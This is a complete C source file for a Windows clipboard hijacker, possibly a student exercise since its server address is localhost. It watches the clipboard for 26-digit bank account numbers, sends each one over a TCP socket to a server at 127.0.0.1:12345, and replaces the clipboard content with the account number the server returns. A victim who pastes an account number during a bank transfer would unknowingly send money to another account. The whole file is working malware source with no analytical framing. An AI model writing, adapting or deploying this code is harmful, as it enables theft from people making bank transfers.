#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#pragma comment(lib, "WSOCK32.lib")

static HWND hwndNxtVwr;
SOCKET s;
int ignore = 0;


int isAccountNo(char* input) {
	int length = 0;
	int len = strlen(input);
	for (int i = 0; i < len; i++) {
		if ((input[i] < '0' || input[i] > '9') && input[i] != ' ') {
			return 0;
		}
		else {
			if (input[i] != ' ') {
				length++;
			}
		}
	}
	if (length == 26)
		return 1;
	return 0;
}


void readCB(HWND hwnd) {
	if (IsClipboardFormatAvailable(CF_TEXT)) {
		OpenClipboard(NULL);
		HANDLE hCbMem = GetClipboardData(CF_TEXT);
		HANDLE hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
		if (hProgMem != NULL){
			LPSTR lpCbMem = (LPSTR)GlobalLock(hCbMem);
			LPSTR lpProgMem = (LPSTR)GlobalLock(hProgMem);
			strcpy(lpProgMem, lpCbMem);

			GlobalUnlock(hCbMem);
			GlobalUnlock(hProgMem);
			CloseClipboard();

			char buf[512] = { '\0' };
			strcpy(buf, lpProgMem);
			
			if (isAccountNo(buf)) {
				send(s, buf, 512, 0);
				if (recv(s, buf, 512, 0) > 0) {
					unsigned int wLen = strlen(buf);
					HGLOBAL hCbMem2 = GlobalAlloc(GHND, (DWORD)wLen + 1);
					LPVOID lpCbMem2 = GlobalLock(hCbMem2);
					char* cpCbMem = (char*)lpCbMem;
					char* cpProgMem = (char*)lpProgMem;
					memcpy(lpCbMem2, buf, wLen + 1);
					GlobalUnlock(hCbMem2);

					ignore = 1;

					OpenClipboard(hwnd);
					EmptyClipboard();
					SetClipboardData(CF_TEXT, hCbMem2);
					CloseClipboard();
				}
			}
		}
	}
}


LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
	switch (message) {
	case WM_CREATE:
		hwndNxtVwr = SetClipboardViewer(hwnd);
		return 0;

	case WM_DESTROY:
		ChangeClipboardChain(hwnd, hwndNxtVwr);
		PostQuitMessage(0);
		return 0;

	case WM_CHANGECBCHAIN:
		if (wParam == (WORD)hwndNxtVwr){
			hwndNxtVwr = (HWND)LOWORD(lParam);
		} else{
			if (hwndNxtVwr != NULL){ 
				SendMessage(hwndNxtVwr, message, wParam, lParam);
			}
		}
		return 0;

	case WM_DRAWCLIPBOARD:
		if (!ignore){
			readCB(hwnd);
			ignore = 0;
		}
		if (hwndNxtVwr != NULL){
			SendMessage(hwndNxtVwr, message, wParam, lParam);
		}
		return 0;

	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
	}
}


int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow){
	const wchar_t CLASS_NAME[] = L"class";
	WNDCLASSEX wc;
	MSG message;
	WNDCLASS window;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = CLASS_NAME;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassEx(&wc)) {
		MessageBox(NULL, L"Window Registration Failed!", L"Error!", MB_ICONEXCLAMATION | MB_OK);
		return 0;
	}

	HWND hwnd = CreateWindowEx(WS_EX_CLIENTEDGE, CLASS_NAME, L"main", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 600, 400, NULL, NULL, hInstance, NULL);
	UpdateWindow(hwnd);

	struct sockaddr_in sa;
	WSADATA wsas;
	WORD version;
	version = MAKEWORD(2, 0);
	WSAStartup(version, &wsas);
	s = socket(AF_INET, SOCK_STREAM, 0);
	memset((void*)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(12345);
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");

	int result = connect(s, (struct sockaddr FAR*) & sa, sizeof(sa));

	if (result == SOCKET_ERROR){
		MessageBoxA(hwnd, "Error", "Connection failed.", 0);
		return 1;
	}
	
	while (GetMessage(&message, (HWND)NULL, 0, 0)){
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	closesocket(s);
	WSACleanup();
	return message.wParam;
}




